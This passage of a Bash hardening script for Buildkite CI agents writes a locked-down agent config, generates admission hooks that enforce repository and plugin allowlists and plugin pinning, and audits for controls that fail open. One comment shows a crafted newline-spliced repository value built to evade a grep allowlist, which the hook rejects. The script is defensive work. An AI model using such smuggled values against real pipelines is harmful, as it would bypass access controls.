  validate_globs "redacted-vars" "${redacted}"

  cat <<CFGEOF
# --- HTH control 2.4: untrusted input ----------------------------------------
# Every value is QUOTED. buildkite-agent.cfg is parsed by a godotenv derivative
# that discards everything after an unquoted '#', which silently truncates any
# pinned plugin pattern ("source#version") and un-anchors it (T10). Keep the
# quotes if you hand-edit this block.
# Only the reviewed definition executes: the pipeline's own command string is
# refused and checkout-override-mode is forced to 'strict'.
no-command-eval="true"
# Repository hooks are attacker-authored on an untrusted branch. See T6.
no-local-hooks="true"
${plugin_lines}
# Anchored at BOTH ends. MatchString is a substring search, so a pattern without
# '^' matches inside a hostile URL and one without '$' matches a prefix of it (T4).
allowed-repositories="${HTH_ALLOWED_REPOSITORIES}"
${env_lines}
# Built-in nine plus local additions; globs, not regexes; 6-byte floor (T2, T3).
redacted-vars="${redacted}"
# --- end HTH control 2.4 -----------------------------------------------------
CFGEOF
}

# Print the block for baking into an image or a config-management template.
emit_cfg() { render_cfg; }

# Idempotent in-place application against an existing config file.
apply_cfg() {
  [ -w "${AGENT_CFG}" ] || die "cannot write ${AGENT_CFG} (run as root)."
  local line key value rendered
  # Render FIRST, into a variable, and only then loop.
  # `done <<<"$(render_cfg)"` is fail-OPEN: die's `exit 1` inside the command
  # substitution kills only that subshell, `set -e` does not propagate a failed
  # substitution used as a redirection word, so the loop reads an empty string,
  # the function runs to completion and apply exits 0 having written NOTHING.
  # An operator provisioning a host then gets "Applied." and exit 0 on an agent
  # with no control on it — the exact "believe 2.4 is implemented when it is
  # not" failure T1 exists to prevent. A plain assignment DOES propagate, and
  # the explicit `|| die` makes it independent of how this function is called.
  rendered="$(render_cfg)" || die "config rendering failed; NOTHING was written to ${AGENT_CFG}. Fix the policy inputs above and re-run."
  [ -n "${rendered}" ] || die "config rendering produced no output; NOTHING was written to ${AGENT_CFG}."
  while IFS= read -r line; do
    case "${line}" in ''|'#'*) continue ;; esac
    key="${line%%=*}"
    # The rendered value is quoted (T10); recover the intended value with the
    # same parser the agent uses, then let set_cfg re-quote and re-verify it.
    value="$(agent_parse_line "${line}")"
    set_cfg "${key}" "${value}"
  done <<<"${rendered}"
  # A key we deliberately never write: reject-secrets. It is a pipeline-upload
  # flag and has no meaning in this file (T7). If a previous attempt put it
  # here, remove it rather than leaving a line that implies a control.
  if grep -qE '^[[:space:]]*reject-secrets[[:space:]]*=' "${AGENT_CFG}"; then
    local tmp dst
    hth_cfg_stage; dst="${HTH_CFG_DST}"; tmp="${HTH_CFG_TMP}"
    grep -vE '^[[:space:]]*reject-secrets[[:space:]]*=' "${dst}" >"${tmp}"
    hth_cfg_commit
    echo "removed inert 'reject-secrets' key from ${AGENT_CFG} (see T7)."
  fi
  echo "Applied. Restart buildkite-agent, then run: $0 audit"
}

# Fail closed on every combination that looks configured but enforces nothing.
audit_cfg() {
  local rc=0 eval_off hooks_off noplugins allowplugins repos envswitch envlist redacted pat
  [ -r "${AGENT_CFG}" ] || die "cannot read ${AGENT_CFG}"

  eval_off="$(read_cfg no-command-eval || true)"
  hooks_off="$(read_cfg no-local-hooks || true)"
  noplugins="$(read_cfg no-plugins || true)"
  allowplugins="$(read_cfg allowed-plugins || true)"
  repos="$(read_cfg allowed-repositories || true)"
  envswitch="$(read_cfg enable-environment-variable-allowlist || true)"
  envlist="$(read_cfg allowed-environment-variables || true)"
  redacted="$(read_cfg redacted-vars || true)"

  # Every value below is the AGENT's view of the file, not the file's text (T10).
  echo "config file                           : ${AGENT_CFG}"
  echo "no-command-eval                       : ${eval_off:-<unset> (default false)}"
  echo "no-local-hooks                        : ${hooks_off:-<unset> (default false)}"
  echo "no-plugins                            : ${noplugins:-<unset>}"
  echo "allowed-plugins                       : ${allowplugins:-<unset>}"
  echo "allowed-repositories                  : ${repos:-<unset>}"
  echo "enable-environment-variable-allowlist : ${envswitch:-<unset> (default false)}"
  echo "redacted-vars                         : ${redacted:-<unset> (built-in nine)}"

  # T10, and it must run BEFORE every other check, because every other check
  # reads read_cfg — the agent's view — and would otherwise report a healthy
  # config without ever mentioning that the file says something else. A sed
  # reader cannot see this class of defect: it prints the pinned, anchored
  # pattern the operator wrote while the agent compiled the truncated one.
  local ktext keff
  for pat in no-command-eval no-local-hooks no-plugins allowed-plugins \
             allowed-repositories enable-environment-variable-allowlist \
             allowed-environment-variables redacted-vars; do
    ktext="$(read_cfg_text "${pat}" || true)"
    keff="$(read_cfg "${pat}" || true)"
    [ -n "${ktext}" ] || continue
    [ "${ktext}" != "${keff}" ] || continue
    echo "FAIL: ${pat} is written as '${ktext}' but the agent will read '${keff}' (T10)." >&2
    echo "      cliconfig/file.go parseLine drops everything after an unquoted '#', so a pinned" >&2
    echo "      plugin pattern loses its version AND its trailing '\$' anchor and degrades to a" >&2
    echo "      prefix match. Quote the value, or re-run '$0 apply' — this pack now quotes on write." >&2
    rc=1
  done

  [ "${eval_off}" = "true" ] || { echo "FAIL: no-command-eval is not true. A pipeline.yml can run arbitrary commands here." >&2; rc=1; }
  [ "${hooks_off}" = "true" ] || { echo "FAIL: no-local-hooks is not true. .buildkite/hooks/* from the checkout executes, and can undo every hook-based control (T6)." >&2; rc=1; }

  # T1, the headline check.
  if [ -n "${allowplugins}" ] && [ -z "${noplugins}" ] \
     && { [ "${eval_off}" = "true" ] || [ "${hooks_off}" = "true" ]; }; then
    echo "FAIL: allowed-plugins is set but the 'no-plugins' key is ABSENT while no-command-eval/no-local-hooks is on." >&2
    echo "      agent_start.go forces no-plugins=true in exactly this case: plugins are OFF and your allowlist is dead configuration." >&2
    echo "      Write 'no-plugins=false' explicitly to enable the allowlist, or drop allowed-plugins and write 'no-plugins=true'." >&2
    rc=1
  fi
  if [ "${noplugins}" = "false" ] && [ -z "${allowplugins}" ]; then
    echo "FAIL: no-plugins=false with no allowed-plugins — every third-party plugin on the internet may execute here." >&2
    rc=1
  fi

  if [ -z "${repos}" ]; then
    echo "FAIL: allowed-repositories unset. The agent will clone any repository a job names." >&2
    rc=1
  else
    local IFS=','
    for pat in ${repos} ${allowplugins} ${envlist}; do
      [ -n "${pat}" ] || continue
      case "${pat}" in '^'*) ;; *) echo "FAIL: allowlist pattern '${pat}' is unanchored (T4)." >&2; rc=1 ;; esac
    done
    unset IFS
  fi

  # T8: this ordering is a startup crash, so catch it before the restart.
  if [ -n "${envlist}" ] && [ "${envswitch}" != "true" ]; then
    echo "FAIL: allowed-environment-variables is set without enable-environment-variable-allowlist." >&2
    echo "      The agent calls l.Fatalf on this and will not start." >&2
    rc=1
  fi

  # T3: prove nothing was dropped from the built-in nine.
  if [ -n "${redacted}" ]; then
    local IFS=','
    for pat in ${AGENT_DEFAULT_REDACTED_VARS}; do
      case ",${redacted}," in
        *",${pat},"*) ;;
        *) echo "FAIL: redacted-vars overrides the built-in list and DROPPED '${pat}'." >&2; rc=1 ;;
      esac
    done
    unset IFS
    validate_globs "redacted-vars" "${redacted}"
  fi

  # T7: this key can only ever be cargo cult here.
  if grep -qE '^[[:space:]]*reject-secrets[[:space:]]*=' "${AGENT_CFG}"; then
    echo "FAIL: 'reject-secrets' in buildkite-agent.cfg is inert — it is a 'pipeline upload' flag, not an 'agent start' one (T7)." >&2
    rc=1
  fi

  for h in pre-bootstrap pre-command; do
    if [ ! -x "${HOOKS_PATH}/${h}" ]; then
      echo "FAIL: ${HOOKS_PATH}/${h} missing or not executable. Run: $0 install-hooks" >&2
      rc=1
    fi
  done

  [ "${rc}" -eq 0 ] && echo "PASS: agent enforces control 2.4."
  return "${rc}"
}
# HTH Guide Excerpt: end config-untrusted-input-agent-cfg

# HTH Guide Excerpt: begin config-untrusted-input-pre-bootstrap
# Job admission BEFORE checkout. exit 0 permits the job; ANY non-zero rejects it
# and no untrusted code has touched the disk yet (job_runner.go:940-950).
# This is the only place in Buildkite where a job can be refused on its own
# inputs, and the only place where BUILDKITE_REPO is still the server-supplied
# value — the docs mark it modifiable by environment/pre-checkout hooks, both of
# which run later.

# printf %q gives us shell-safe embedding of policy values into the generated
# hook without a second config file to protect.
shq() { printf '%q' "$1"; }

write_pre_bootstrap() {
  local dest="${HOOKS_PATH}/pre-bootstrap" tmp
  [ -d "${HOOKS_PATH}" ] || die "hooks path ${HOOKS_PATH} does not exist."
  tmp="${dest}.hth.tmp"
  {
    printf '#!/usr/bin/env bash\n'
    printf '# Generated by HTH buildkite 2.4 pack. Edit the pack, not this file.\n'
    printf 'HTH_ALLOWED_REPOSITORIES=%s\n' "$(shq "${HTH_ALLOWED_REPOSITORIES}")"
    printf 'HTH_ALLOWED_PLUGINS=%s\n'      "$(shq "${HTH_ALLOWED_PLUGINS}")"
    printf 'HTH_ALLOW_FORK_BUILDS=%s\n'    "$(shq "${HTH_ALLOW_FORK_BUILDS}")"
    printf 'HTH_REQUIRE_PLUGIN_SHA=%s\n'   "$(shq "${HTH_REQUIRE_PLUGIN_SHA}")"
    cat <<'PREBOOTSTRAP'

# No `set -e`: every exit path here is deliberate, and an unexpected non-zero
# from a helper must not be mistaken for a considered rejection.
set -uo pipefail

reject() { echo "pre-bootstrap: REJECTED job ${BUILDKITE_JOB_ID:-?}: $*" >&2; exit 1; }
permit() { echo "pre-bootstrap: admitted job ${BUILDKITE_JOB_ID:-?}: $*"; exit 0; }

# Fail closed on a broken agent host. A missing jq must not mean "allow".
command -v jq >/dev/null 2>&1 || reject "jq is not installed on this agent host"

# T5: the job's variables are NOT in this hook's environment. They are in a file.
[ -n "${BUILDKITE_ENV_JSON_FILE:-}" ] || reject "BUILDKITE_ENV_JSON_FILE is unset"
[ -r "${BUILDKITE_ENV_JSON_FILE}" ]   || reject "cannot read ${BUILDKITE_ENV_JSON_FILE}"

# READ, never source. The sibling shell-format file is Go %q-quoted, not shell
# escaped, and its values are attacker-supplied (job_runner.go:565-573).
jget() { jq -r --arg k "$1" '.[$k] // ""' "${BUILDKITE_ENV_JSON_FILE}"; }

repo="$(jget BUILDKITE_REPO)"
pr_repo="$(jget BUILDKITE_PULL_REQUEST_REPO)"
pr_num="$(jget BUILDKITE_PULL_REQUEST)"
plugins_json="$(jget BUILDKITE_PLUGINS)"
pipeline="$(jget BUILDKITE_PIPELINE_SLUG)"

# grep -E is POSIX ERE while the agent uses Go RE2. Keep policy patterns in the
# common subset (anchors, character classes, ., *, +, ?, alternation) so the
# admission decision here and the agent's own allowlist cannot disagree.
#
# The one place they WOULD disagree is a newline: RE2's `^` and `$` anchor the
# whole text, grep's anchor each LINE, so a value spliced together as
# "git@github.com:evil/x\ngit@github.com:acme/ok.git" satisfies grep on its
# second line while the agent's pattern matches none of it. Refuse such a value
# outright rather than let this hook be the more permissive of the two.
HTH_NL='
'
matches_any() {
  local value="$1" list="$2" pat
  case "${value}" in
    *"${HTH_NL}"*) return 1 ;;
  esac
  local IFS=','
  for pat in ${list}; do
    [ -n "${pat}" ] || continue
    if printf '%s' "${value}" | grep -Eq "${pat}"; then return 0; fi
  done
  return 1
}

[ -n "${repo}" ] || reject "BUILDKITE_REPO is empty; cannot evaluate repository policy"
matches_any "${repo}" "${HTH_ALLOWED_REPOSITORIES}" \
  || reject "repository ${repo} is not in the allowlist"

# T11: the two repository variables arrive in DIFFERENT URL FORMS for the SAME
# repository, so `[ "$pr_repo" != "$repo" ]` calls every internal pull request a
# fork. Buildkite's own examples are BUILDKITE_REPO
# "git@github.com:acme-inc/my-project.git" against BUILDKITE_PULL_REQUEST_REPO
# "git://github.com/acme-inc/my-project.git". Compare identity, not text: the
# scheme, any userinfo, a port and a trailing ".git" carry none of it.
norm_repo() {
  local u="${1}" host rest sep port
  u="${u%/}"
  case "${u}" in *://*) u="${u#*://}" ;; esac        # git:// https:// ssh:// http://
  case "${u%%[/:]*}" in *@*) u="${u#*@}" ;; esac     # git@ / user@ / token@, authority only
  u="${u%.git}"
  host="${u%%[:/]*}"
  rest="${u#"${host}"}"
  sep="${rest:0:1}"
  rest="${rest:1}"
  # "host:org/repo" (scp form) and "host:443/org/repo" (URL port) both land here.
  # Strip the leading segment ONLY when it is entirely digits and something
  # follows it: dropping a path segment that merely starts with a digit would
  # make two DIFFERENT repositories compare equal, and that is the direction
  # that turns a fork into a permitted internal build.
  if [ "${sep}" = ":" ]; then
    port="${rest%%/*}"
    case "${port}" in
      ""|*[!0-9]*) : ;;
      *) [ "${port}" = "${rest}" ] || rest="${rest#*/}" ;;
    esac
  fi
  rest="${rest#/}"
  printf '%s/%s' "$(printf '%s' "${host}" | tr 'A-Z' 'a-z')" "${rest}"
}

# Fork detection. BUILDKITE_PULL_REQUEST_REPO is "" when the build is not a pull
# request, and holds the SOURCE repository's URL when it is. A value that is not
# the same repository as BUILDKITE_REPO means the code is coming from a
# repository you do not own.
if [ -n "${pr_repo}" ] && [ "$(norm_repo "${pr_repo}")" != "$(norm_repo "${repo}")" ]; then
  [ "${HTH_ALLOW_FORK_BUILDS}" = "true" ] \
    || reject "fork build (PR #${pr_num} from ${pr_repo}) — forks run contributor code on this agent's credentials"
  # The allowlist is matched against the RAW value, because that is the form the
  # agent's own allowed-repositories sees. Buildkite hands fork URLs as
  # "git://host/org/repo.git", so an allowlist written only as "^git@host:org/…"
  # rejects every fork even with fork builds enabled — add a "^git://…"
  # alternate when HTH_ALLOW_FORK_BUILDS is true.
  matches_any "${pr_repo}" "${HTH_ALLOWED_REPOSITORIES}" \
    || reject "fork ${pr_repo} is not in the allowlist (fork URLs arrive in git:// form; HTH_ALLOWED_REPOSITORIES needs a '^git://' alternate)"
fi

# Plugins. BUILDKITE_PLUGINS is a JSON array of single-key objects whose key is
# the plugin reference ("source#ref"); the agent parses it the same way
# (job_runner.go:888-897, []map[string]json.RawMessage).
if [ -n "${plugins_json}" ] && [ "${plugins_json}" != "null" ]; then
  if [ "${HTH_ALLOWED_PLUGINS}" = "NONE" ]; then
    reject "plugins are forbidden on this agent but the step declares some"
  fi
  plugin_refs="$(printf '%s' "${plugins_json}" | jq -r '
      def refs: if type == "string" then . elif type == "object" then keys_unsorted[] else empty end;
      if type == "array" then (.[] | refs) elif type == "object" then keys_unsorted[] else empty end
    ' 2>/dev/null)" || reject "BUILDKITE_PLUGINS is not parseable JSON"
  [ -n "${plugin_refs}" ] || reject "BUILDKITE_PLUGINS is set but no plugin reference could be extracted"

  while IFS= read -r ref; do
    [ -n "${ref}" ] || continue
    matches_any "${ref}" "${HTH_ALLOWED_PLUGINS}" \
      || reject "plugin ${ref} is not in the allowlist"

    # Guide step 2.2: pin every plugin reference. A floating ref is an
    # unreviewed dependency that the plugin author can change under you.
    case "${ref}" in
      *'#'*) pin="${ref##*#}" ;;
      *)     pin="" ;;
    esac
    [ -n "${pin}" ] || reject "plugin ${ref} is unpinned (no #version or #commit)"
    case "${pin}" in
      main|master|HEAD|latest|stable)
        reject "plugin ${ref} is pinned to the moving ref '${pin}'" ;;
    esac
    if [ "${HTH_REQUIRE_PLUGIN_SHA}" = "true" ]; then
      printf '%s' "${pin}" | grep -Eq '^[0-9a-f]{40}$' \
        || reject "plugin ${ref} is not pinned to a 40-hex commit (tags are mutable)"
    fi
  done <<EOF
${plugin_refs}
EOF
fi

permit "pipeline=${pipeline} repo=${repo}"
PREBOOTSTRAP
  } >"${tmp}"
  chmod 0755 "${tmp}"
  mv "${tmp}" "${dest}"
  echo "wrote ${dest}"
}
# HTH Guide Excerpt: end config-untrusted-input-pre-bootstrap

# HTH Guide Excerpt: begin config-untrusted-input-pre-command
# Pin the pipeline-upload secret guard at the last global hook before the
# command runs (T6), correctly on both agent majors (T7).

write_pre_command() {
  local dest="${HOOKS_PATH}/pre-command" tmp
  [ -d "${HOOKS_PATH}" ] || die "hooks path ${HOOKS_PATH} does not exist."
  tmp="${dest}.hth.tmp"
  cat >"${tmp}" <<'PRECOMMAND'
#!/usr/bin/env bash
# Generated by HTH buildkite 2.4 pack. Edit the pack, not this file.
set -uo pipefail

# T7: v3 reads REJECT_SECRETS (default off, must be turned ON).
#     v4 removed it and reads ALLOW_SECRETS (default off, must stay UNSET).
# Each major ignores the other's variable, so doing both is correct everywhere
# and needs no version detection to be safe.
export BUILDKITE_AGENT_PIPELINE_UPLOAD_REJECT_SECRETS=true
unset BUILDKITE_AGENT_PIPELINE_UPLOAD_ALLOW_SECRETS

# T6: runtime ratchet. The executor re-reads this before each local hook and
# only ever uses it to DISABLE, so a pipeline cannot flip it back. This is a
# belt: local post-checkout hooks already ran, which is why no-local-hooks=true
# in buildkite-agent.cfg remains the actual control.
export BUILDKITE_NO_LOCAL_HOOKS=true

# Informational only — the exports above are already correct on both majors.
if command -v buildkite-agent >/dev/null 2>&1; then
  agent_version="$(buildkite-agent --version 2>/dev/null | grep -Eo '[0-9]+\.[0-9]+\.[0-9]+[^ ,]*' | head -1)"
  case "${agent_version%%.*}" in
    3) echo "pre-command: agent v${agent_version}: pipeline uploads containing interpolated secrets will be rejected (--reject-secrets)." ;;
    4|5|6|7|8|9) echo "pre-command: agent v${agent_version}: secret rejection is the default; --allow-secrets is cleared." ;;
    *) echo "pre-command: could not determine agent major version; both secret-guard variables set defensively." >&2 ;;
  esac
fi
PRECOMMAND
  chmod 0755 "${tmp}"
  mv "${tmp}" "${dest}"
  echo "wrote ${dest}"
}

install_hooks() {
  validate_regexes "allowed-repositories" "${HTH_ALLOWED_REPOSITORIES}"
  [ "${HTH_ALLOWED_PLUGINS}" = "NONE" ] \
    || validate_regexes "allowed-plugins" "${HTH_ALLOWED_PLUGINS}"
  # T11: fork URLs arrive as git://host/org/repo.git. An allowlist that only
  # spells the git@ or https:// form admits no fork at all, so enabling fork
  # builds without a git:// alternate produces a control that looks configured
  # and rejects every pull request from outside the org.
  if [ "${HTH_ALLOW_FORK_BUILDS}" = "true" ]; then
    case ",${HTH_ALLOWED_REPOSITORIES}," in
      *',^git://'*) : ;;
      *) echo "WARNING: HTH_ALLOW_FORK_BUILDS=true but no '^git://' pattern is in HTH_ALLOWED_REPOSITORIES. Buildkite reports BUILDKITE_PULL_REQUEST_REPO in git:// form (T11), so every fork build will be rejected by the allowlist." >&2 ;;
    esac
  fi
  write_pre_bootstrap
  write_pre_command
  echo "Hooks installed under ${HOOKS_PATH}. Restart buildkite-agent so the"
  echo "pre-bootstrap hook is picked up, then run: $0 audit"
}
# HTH Guide Excerpt: end config-untrusted-input-pre-command

case "${1:-audit}" in
  emit)          emit_cfg ;;
  apply)         apply_cfg ;;
  install-hooks) install_hooks ;;
  audit)         audit_cfg ;;
  *)
    cat >&2 <<'USAGE'
usage:
  hth-buildkite-2.04-agent-untrusted-input.sh emit           print the hardened buildkite-agent.cfg block
  hth-buildkite-2.04-agent-untrusted-input.sh apply          apply it in place (idempotent, root)
  hth-buildkite-2.04-agent-untrusted-input.sh install-hooks  write pre-bootstrap + pre-command hooks
  hth-buildkite-2.04-agent-untrusted-input.sh audit          prove enforcement is real (exit 1 on fail)

Required for emit/apply/install-hooks:
  HTH_ALLOWED_REPOSITORIES  comma-separated ANCHORED regexes, e.g.
                            '^git@github\.com:acme/[A-Za-z0-9._-]+$,^https://github\.com/acme/[A-Za-z0-9._-]+$'
  HTH_ALLOWED_PLUGINS       comma-separated ANCHORED regexes, or the literal
                            NONE to forbid plugins entirely

Optional:
  HTH_EXTRA_REDACTED_VARS            extra GLOBS appended to the built-in nine
  HTH_ALLOWED_ENVIRONMENT_VARIABLES  anchored regexes for job-supplied env vars
  HTH_ALLOW_FORK_BUILDS              'true' to admit fork PR builds (default false).
                                     Buildkite reports fork URLs in git:// form,
                                     so HTH_ALLOWED_REPOSITORIES then needs a
                                     '^git://github\.com/…$' alternate too (T11)
  HTH_REQUIRE_PLUGIN_SHA             'true' to demand 40-hex plugin pins
  BUILDKITE_AGENT_CONFIG             default /etc/buildkite-agent/buildkite-agent.cfg
  BUILDKITE_HOOKS_PATH               default /etc/buildkite-agent/hooks

The agent reads its config once at start. Apply, restart, then audit.
USAGE
    exit 2 ;;
esac
